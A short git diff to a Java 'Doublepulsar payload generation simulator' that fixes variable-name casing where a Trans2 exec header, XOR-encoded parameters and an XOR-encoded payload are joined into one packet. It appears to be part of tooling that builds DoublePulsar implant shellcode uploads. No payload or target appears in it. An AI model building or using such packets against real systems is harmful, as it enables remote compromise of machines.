@@ -3,7 +3,7 @@ import java.util.*;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 
-
+import java.io.UnsupportedEncodingException;
 /*
 Doublepulsar payload generation simulator
 */
@@ -207,11 +207,11 @@ public class DoublepulsarUploadShellcode {
         // Create a new byte array to hold all three byte arrays
         byte[] doublepulsar_packet = new byte[4178];
         System.arraycopy(trans2_exec, 0, doublepulsar_packet, 0, trans2_exec.length);
-        System.arraycopy(XorParameterBytes, 0, doublepulsar_packet, trans2_exec.length, XORParameterBytes.length);
-        System.arraycopy(XorPayload, 0, doublepulsar_packet, trans2_exec.length + XORParameterBytes.length, XorPayload.length);
+        System.arraycopy(XorParameterBytes, 0, doublepulsar_packet, trans2_exec.length, XorParameterBytes.length);
+        System.arraycopy(XorPayload, 0, doublepulsar_packet, trans2_exec.length + XorParameterBytes.length, XorPayload.length);
         
         // Print out the merged array to verify (Optional)
         System.out.println("Merged byte array length: " + doublepulsar_packet.length);
-        
+    
     }
 }
